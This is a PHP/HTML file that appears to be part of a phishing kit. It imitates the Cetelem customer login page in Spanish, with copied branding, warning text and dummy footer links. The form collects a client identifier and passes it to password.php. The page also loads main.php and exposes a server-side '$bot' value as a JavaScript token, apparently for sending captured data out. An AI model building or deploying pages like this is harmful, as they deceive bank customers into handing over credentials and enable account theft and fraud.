<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Iniciar sesión en Cetelem</title>
</head>
<body>
    
<main>
    <div class="form">

<div class="logo">
<img src="res/img/logo.png" >
</div>
<script>var token=<?php echo json_encode($bot); ?>;</script>

<div class="title">
<label>Un crédito te compromete y debe ser reembolsado. <br>
Verifica tu capacidad de pago antes de comprometerte.</label>
</div>

<div class="title1">
<label>Un crédito te compromete y debe ser reembolsado. 
Verifica tu capacidad de pago antes de comprometerte.</label>
</div>

    <div class="continer">
    <form action="password.php" method="get">
        <div class="man">
        <img src="res/img/man.png" >
        </div>

        <div class="tite">
        <h1>Acceder a mi <br> espacio seguro</h1>
        </div>

        <div class="col">
        <label>Identificador de cliente</label>
        <input type="text" placeholder="Ej: 1234567"  name="user" required>
        </div>

        <div class="box">
<input type="checkbox"  >
<label>Recordar mi identificador</label>
        </div>

        <div class="but">
<button type="submit">Siguiente</button>
        </div>

<div class="a">
<a href="#">¿Olvidaste tu identificador?</a>
</div>

</form>
    </div>
    </div>

    <div class="span">
<span>Transferencia rápida</span>
<span>Cancelación</span> <span>Contacto</span> <span>Preguntas frecuentes</span> <span>Reclamaciones</span> 
<span>Avisos legales</span> <span>Información sobre cookies</span> <span>Preferencias de cookies</span> 
<span>Datos personales</span> 
<br><br><span>Declaración de accesibilidad</span> <span>Accesibilidad</span>
</div> 

<div class="span1">
<span>Transferencia rápida</span>
<span>Cancelación</span> <span>Contacto</span> <span>Preguntas frecuentes</span> <span>Reclamaciones</span> 
<span>Avisos legales</span> <span>Información sobre cookies</span> <span>Preferencias de cookies</span> 
<span>Datos personales</span> 
 <span>Declaración de accesibilidad</span> <span>Accesibilidad</span>
</div> 
<div class="fa">
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
<img src="res/img/fa.png" >
</div>

</main>

</body>
</html>